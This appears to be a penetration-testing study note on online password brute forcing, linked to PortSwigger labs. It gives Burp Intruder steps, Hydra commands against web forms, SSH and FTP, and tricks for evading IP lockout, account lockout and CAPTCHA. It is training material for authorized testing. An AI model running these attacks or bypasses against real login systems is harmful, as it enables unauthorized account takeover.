---
tags: [vapt, authentication, beginner]
difficulty: beginner
module: "16 - Authentication"
topic: "16.02 Password Brute Force"
portswigger_labs: ["Password brute-force via password change", "Broken brute-force protection, IP block"]
---

# 16.02 — Password Brute Force

## What Is Brute Forcing?

```
BRUTE FORCE:
  Systematically try many passwords against a known username
  until one works!
  
  TYPES:
  Pure brute force:   Try every combination (aaa, aab, aac... zzz)
                      Only practical for short pins (4-6 digits)
                      
  Dictionary attack:  Try passwords from a wordlist
                      rockyou.txt has 14 million real passwords!
                      Most effective method in practice
                      
  Rule-based:         Apply transforms to wordlist
                      "password" → Password, passw0rd, P@ssword1
                      Hashcat/John with rules
                      
  Credential stuffing: Try username:password pairs from breached databases
                       (See note 16.03)
```

---

## Online vs Offline Brute Force

```
ONLINE BRUTE FORCE:
  - Attacking a live login endpoint
  - Rate limited, lockout, CAPTCHA may block you
  - Slow (100-1000 attempts/min realistic)
  - Leave logs on target server!
  
OFFLINE BRUTE FORCE (password cracking):
  - Have the hash (from SQLi, breach, etc.)
  - Run Hashcat/John locally — millions of attempts/sec
  - No lockout possible
  - No logs on target
  
THIS NOTE = ONLINE BRUTE FORCE (VAPT context)
```

---

## Burp Intruder Attack

```
STEP 1: Intercept login request
  POST /login HTTP/1.1
  username=admin&password=§FUZZ§
  
STEP 2: Burp Intruder → Sniper → mark §FUZZ§ as payload position

STEP 3: Payload = Simple list
  Load: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
  OR:   /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

STEP 4: Start attack → sort by:
  - Status code (200 vs 302 on success)
  - Response length (success page is different size)
  - "Grep - Match" for success indicators ("Welcome", "Dashboard", etc.)
  
COMMON WORDLISTS:
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
/usr/share/seclists/Passwords/Common-Credentials/best110.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt (75% of rockyou)
```

---

## Hydra Attack

```bash
# HTTP FORM BRUTE FORCE:
hydra -l admin -P /usr/share/seclists/Passwords/rockyou-75.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid password" \
  -t 10 -w 3

# ARGUMENTS:
# -l admin         → single username
# -L users.txt     → username list
# -P rockyou.txt   → password list
# /login           → path
# username=^USER^  → username field placeholder
# password=^PASS^  → password field placeholder
# F=Invalid password → failure string (what failed login shows)
# -t 10            → 10 threads
# -w 3             → wait 3 seconds for response

# HTTP BASIC AUTH:
hydra -l admin -P passwords.txt target.com http-get /admin

# HTTPS:
hydra -l admin -P passwords.txt -S target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"

# SSH:
hydra -l root -P passwords.txt target.com ssh -t 4

# FTP:
hydra -l admin -P passwords.txt target.com ftp
```

---

## Identifying Success

```
INDICATORS OF SUCCESSFUL LOGIN:

1. Status code change:
   Failed:  200 OK (login page)
   Success: 302 Found (redirect to dashboard)
   
2. Response body:
   Failed:  "Invalid password"
   Success: "Welcome back, admin!"
   
3. Cookies:
   Failed:  No Set-Cookie header (or same session)
   Success: New Set-Cookie: session=XXXX
   
4. Response length:
   Failed:  ~1500 bytes (login form again)
   Success: ~8000 bytes (dashboard with full content)
   
BURP INTRUDER TRICK:
  Results → Columns → check "Status" and "Length"
  Sort by Status: 302 stands out immediately!
```

---

## Bypassing Basic Protections

```
IP-BASED LOCKOUT BYPASS:
  Add X-Forwarded-For header with different IPs:
  X-Forwarded-For: 1.2.3.4
  → Many apps trust this header for "real IP"!
  
  Change IP per request in Burp:
  Intruder → Payload Processing → Add prefix → 1.2.3.§N§.4
  
ACCOUNT LOCKOUT BYPASS:
  Some apps lock after N failures for USERNAME.
  Strategy: Use many usernames with one password each
  "Password spraying" — see note 16.04
  
CAPTCHA BYPASS:
  - Some CAPTCHAs are on same token if answer is cached
  - Audio CAPTCHA OCR (less common now)
  - CAPTCHA solving services (2captcha, AntiCaptcha) — legal in CTF/authorized tests
  - Try if CAPTCHA only on GET, not POST
  
CSRF TOKEN IN FORM:
  Need to fetch fresh CSRF token per request!
  Burp Macro: GET /login → extract csrf_token → use in POST
  Intruder → Session Handling Rules → Macro
```

---

## Related Notes
- [[01 - Username Enumeration]] — enumerate valid usernames first
- [[03 - Credential Stuffing]] — try known breached passwords
- [[04 - Password Spraying]] — avoid lockout by spraying
- [[10 - Account Lockout Bypass]] — circumventing lockout mechanisms
- [[28 - Defense Rate Limiting Lockout MFA]] — mitigations
